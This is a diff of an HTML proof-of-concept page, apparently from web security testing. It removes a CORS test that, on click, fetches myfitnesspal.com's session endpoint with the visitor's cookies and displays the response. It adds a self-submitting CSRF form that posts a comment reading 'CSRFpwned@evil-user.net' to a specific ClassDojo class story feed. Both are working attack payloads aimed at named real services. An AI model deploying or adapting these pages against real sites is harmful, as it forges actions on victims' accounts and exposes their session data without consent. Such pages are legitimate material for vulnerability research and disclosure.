@@ -1,31 +1,10 @@
-<!DOCTYPE html>
 <html>
-<head>
-    <title>CORS Test</title>
-</head>
-<body>
-  <p>Click anywhere on this page to trigger the Cross-origin request.</p>
-  <div id="response"></div>
-
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      document.onclick = () => {
-        open('https://www.myfitnesspal.com/');
-
-        fetch('https://www.myfitnesspal.com/api/auth/session/', {
-          method: 'GET',
-          credentials: 'include',
-          mode: 'cors'
-        })
-          .then(response => response.json())
-          .then(data => {
-            document.getElementById('response').innerHTML = JSON.stringify(data, null, 2);
-          })
-          .catch(error => {
-            console.log('Failed to issue Cross-origin request');
-          });
-      }
-    });
-  </script>
-</body>
+    <body>
+        <form action="https://teach.classdojo.com/api/dojoClass/6971f28f8a5dbae528dd62ce/storyFeed/6971f4bdf0e461e7747059e7/comments" method="POST">
+            <input type="hidden" name="body" value="CSRFpwned@evil-user.net" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+    </body>
 </html>
